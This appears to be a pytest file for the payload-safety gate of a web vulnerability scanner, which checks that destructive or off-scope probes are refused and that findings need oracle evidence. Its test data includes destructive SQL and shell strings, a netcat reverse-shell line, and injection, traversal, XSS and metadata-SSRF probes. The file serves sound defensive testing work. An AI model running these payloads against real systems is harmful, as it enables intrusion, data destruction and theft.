"""Adaptive payload probes: the pure gate that decides what may be sent.

These tests pin the two properties that make the probe a validation tool rather
than a liability: nothing destructive/off-scope ever leaves, and a finding is
only confirmed when the oracle actually fires against a baseline.
"""
from app.exploit.payload_gen import (inject, is_destructive, marker,
                                     oracle_fired, smuggles_host, validate_probe)


class R:
    """Minimal stand-in for SafeResponse."""
    def __init__(self, status_code=200, text=""):
        self.status_code = status_code
        self.text = text


def in_scope(host):
    return host.endswith("example.com")


# ---- destructive denylist ----
def test_destructive_payloads_are_refused():
    for bad in ["1; DROP TABLE users--", "1 UNION SELECT 1 INTO OUTFILE '/tmp/x'",
                "'; DELETE FROM sessions--", "; rm -rf /", "a|sh", "; shutdown -h now",
                "$(nc -e /bin/sh 10.0.0.1 4444)", "x > /etc/passwd",
                "1; UPDATE users SET admin=1", "; cat /etc/passwd >> /tmp/out"]:
        assert is_destructive(bad), bad


def test_read_only_probe_payloads_are_allowed():
    for ok in ["1' AND '1'='1", "${7*7}", "{{7*7}}", "../../../../etc/passwd",
               "1 OR 1=1", "<svg onload=1>", "' UNION SELECT null,null--"]:
        assert not is_destructive(ok), ok


def test_shell_verbs_only_count_in_command_position():
    # '/etc/passwd' is THE read-only LFI oracle - refusing it would gut LFI
    # validation. The passwd COMMAND is still refused.
    assert not is_destructive("../../../../etc/passwd")
    assert not is_destructive("/proc/self/environ")
    assert is_destructive("; passwd root")
    assert is_destructive("`chown root x`")
    assert is_destructive("$(useradd hacker)")


def test_sleep_is_bounded_not_banned():
    assert not is_destructive("1' AND sleep(5)--")     # timing oracle, fine
    assert is_destructive("1' AND sleep(120)--")       # DoS, refused


# ---- scope smuggling ----
def test_payload_cannot_smuggle_offscope_host():
    assert smuggles_host("http://evil.tld/x", in_scope)
    assert smuggles_host("//attacker.io", in_scope)
    assert not smuggles_host("https://app.example.com/cb", in_scope)
    assert not smuggles_host("${7*7}", in_scope)


# ---- probe validation ----
def _probe(**kw):
    base = {"oracle": "math", "param": "id", "payload": "${7*7}", "expect": "49"}
    base.update(kw)
    return base


TARGET = "https://app.example.com/item?id=1"


def test_valid_probe_is_normalised():
    p = validate_probe(_probe(), TARGET, in_scope)
    assert p and p["oracle"] == "math" and p["param"] == "id"


def test_probe_rejected_on_unknown_oracle_or_missing_expect():
    assert validate_probe(_probe(oracle="vibes"), TARGET, in_scope) is None
    assert validate_probe(_probe(expect=""), TARGET, in_scope) is None


def test_differential_probe_requires_both_payloads():
    assert validate_probe(_probe(oracle="differential", expect="x"),
                          TARGET, in_scope) is None
    ok = validate_probe(_probe(oracle="differential", payload="1' AND '1'='1",
                               payload_false="1' AND '1'='2", expect="x"),
                        TARGET, in_scope)
    assert ok is not None


def test_probe_rejected_when_destructive_or_offscope():
    assert validate_probe(_probe(payload="1; DROP TABLE t--"), TARGET, in_scope) is None
    assert validate_probe(_probe(payload="http://evil.tld/x"), TARGET, in_scope) is None
    # target itself out of scope
    assert validate_probe(_probe(), "https://evil.tld/a?id=1", in_scope) is None


def test_probe_rejected_on_bad_param_or_oversized_payload():
    assert validate_probe(_probe(param="id; drop"), TARGET, in_scope) is None
    assert validate_probe(_probe(payload="A" * 500), TARGET, in_scope) is None


# ---- injection ----
def test_inject_replaces_and_adds_params():
    assert inject("https://t/a?id=1&x=2", "id", "9") == "https://t/a?id=9&x=2"
    assert "q=z" in inject("https://t/a", "q", "z")
    assert inject("not a url", "q", "z") is None


# ---- oracles: signal must be absent from the baseline ----
def test_math_oracle_needs_absence_in_baseline():
    base = R(text="hello 1")
    assert oracle_fired("math", baseline=base, positive=R(text="hello 49"), expect="49")
    # 49 already present in the baseline -> coincidence, not proof
    assert not oracle_fired("math", baseline=R(text="page 49"),
                            positive=R(text="page 49"), expect="49")


def test_differential_oracle_true_tracks_baseline_false_diverges():
    base = R(text="A" * 1000)
    same = R(text="A" * 1000)
    diff = R(text="B" * 200)
    assert oracle_fired("differential", baseline=base, positive=same, negative=diff)
    # both identical -> no boolean signal
    assert not oracle_fired("differential", baseline=base, positive=same, negative=same)
    # differential without a negative response cannot conclude
    assert not oracle_fired("differential", baseline=base, positive=same)


def test_status_flip_oracle():
    assert oracle_fired("status_flip", baseline=R(403), positive=R(200))
    assert not oracle_fired("status_flip", baseline=R(200), positive=R(200))


def test_unknown_oracle_and_missing_response_never_confirm():
    assert not oracle_fired("magic", baseline=R(), positive=R())
    assert not oracle_fired("math", baseline=R(), positive=None, expect="49")
    assert not oracle_fired("math", baseline=None, positive=R(), expect="49")


def test_marker_is_unique_and_benign():
    a, b = marker(), marker()
    assert a != b and a.isalnum()


# ---- per-engine payload families (all languages, not just SQL) ----
def test_families_pick_the_dialect_of_the_detected_stack():
    from app.exploit.payload_families import families_for
    py = families_for("ssti", ["Python", "Flask", "Werkzeug"])
    assert py and py[0].engine == "jinja2" and py[0].payload.startswith("{{")

    java = families_for("ssti", ["Java", "Tomcat", "Freemarker"])
    assert java and java[0].payload.startswith("${")

    dotnet = families_for("ssti", ["ASP.NET", "IIS"])
    assert dotnet and dotnet[0].payload.startswith("@(")

    ruby = families_for("ssti", ["Ruby on Rails"])
    assert ruby and "<%=" in ruby[0].payload


def test_families_cover_many_classes_not_just_sql():
    from app.exploit.payload_families import supported_classes
    covered = supported_classes()
    for cls in ("ssti", "sqli", "nosqli", "ldapi", "xpathi", "command_injection",
                "lfi", "xss", "crlf", "open_redirect", "ssrf",
                "prototype_pollution"):
        assert cls in covered, cls


def test_class_aliases_resolve():
    from app.exploit.payload_families import families_for
    assert families_for("sql_injection", [])          # alias of sqli
    assert families_for("path_traversal", [])         # alias of lfi
    assert families_for("template_injection", [])     # alias of ssti
    assert families_for("rce", [])                    # alias of command_injection


def test_os_specific_traversal_and_command_payloads():
    from app.exploit.payload_families import families_for
    win = families_for("lfi", ["Windows", "IIS"])
    assert any("win.ini" in f.payload for f in win)
    nix = families_for("lfi", ["Linux", "nginx"])
    assert any("etc/passwd" in f.payload for f in nix)
    wcmd = families_for("command_injection", ["Windows", "IIS"])
    assert any("whoami" in f.payload for f in wcmd)


def test_every_family_is_non_destructive_and_carries_an_oracle():
    from app.exploit.payload_families import FAMILIES
    from app.exploit.payload_gen import ORACLES, is_destructive
    for f in FAMILIES:
        assert f.oracle in ORACLES, f
        assert not is_destructive(f.payload), f.payload
        assert not is_destructive(f.payload_false or ""), f.payload_false
        if f.oracle in ("math", "signature", "reflection", "header", "timing"):
            assert f.expect, f
        if f.oracle == "differential":
            assert f.payload_false, f


def test_catalog_families_survive_probe_validation():
    from app.exploit.payload_families import FAMILIES
    from app.exploit.payload_gen import substitute, validate_probe
    for f in FAMILIES:
        probe = f.as_probe("id")
        probe["vuln_class"] = f.vuln_class
        # same order as the live path: resolve placeholders, then validate
        assert validate_probe(substitute(probe, TARGET), TARGET, in_scope) is not None, f


# ---- timing oracle (blind injection) ----
def test_timing_oracle_bounds_and_fires():
    from app.exploit.payload_gen import oracle_fired, timing_seconds
    assert timing_seconds("5") == 5
    assert timing_seconds("120") is None      # DoS window refused
    assert timing_seconds("0") is None
    assert timing_seconds("abc") is None

    # fast baseline, probe waited ~5s -> confirmed
    assert oracle_fired("timing", baseline=R(), positive=R(), expect="5",
                        base_ms=120, pos_ms=5200)
    # endpoint is simply slow -> not a hit
    assert not oracle_fired("timing", baseline=R(), positive=R(), expect="5",
                            base_ms=4800, pos_ms=5200)
    # no timing data -> cannot conclude
    assert not oracle_fired("timing", baseline=R(), positive=R(), expect="5")


# ---- header oracle (open redirect / CRLF) ----
def test_header_oracle_needs_absence_in_baseline():
    from app.exploit.payload_gen import oracle_fired

    class H(R):
        def __init__(self, headers, **kw):
            super().__init__(**kw)
            self.headers = headers

    base = H({"content-type": "text/html"})
    redirect = H({"location": "https://app.example.com/abc123"})
    assert oracle_fired("header", baseline=base, positive=redirect, expect="abc123")
    # already redirecting there before our payload -> not caused by us
    assert not oracle_fired("header", baseline=redirect, positive=redirect,
                            expect="abc123")


# ---- SSRF canaries: target's own infra allowed, third parties never ----
def test_ssrf_canaries_allowed_but_third_parties_refused():
    from app.exploit.payload_families import SSRF_CANARY_HOSTS
    from app.exploit.payload_gen import smuggles_host
    assert not smuggles_host("http://169.254.169.254/latest/meta-data/",
                             in_scope, SSRF_CANARY_HOSTS)
    assert smuggles_host("http://169.254.169.254/", in_scope)      # not opted in
    assert smuggles_host("http://evil.tld/", in_scope, SSRF_CANARY_HOSTS)


# ---- placeholder substitution mints our own observable ----
def test_substitute_mints_unique_marker_and_same_host_redirect():
    from app.exploit.payload_gen import substitute
    p = substitute({"oracle": "reflection", "param": "q",
                    "payload": "<SYPHAXMARK>", "expect": "SYPHAXMARK",
                    "payload_false": ""}, TARGET)
    assert "SYPHAXMARK" not in p["payload"] and p["expect"] in p["payload"]
    assert len(p["expect"]) > 8

    r = substitute({"oracle": "header", "param": "next",
                    "payload": "SYPHAX_REDIRECT_URL", "expect": "SYPHAX_REDIRECT_HOST",
                    "payload_false": ""}, TARGET)
    # redirect target stays on the finding's own host
    assert r["payload"].startswith("https://app.example.com/")
    assert r["expect"] in r["payload"]


def test_params_of_finds_injection_points():
    from app.exploit.payload_gen import params_of
    assert params_of("https://t/a?id=1&q=x") == ["id", "q"]
    assert params_of("https://t/a") == []
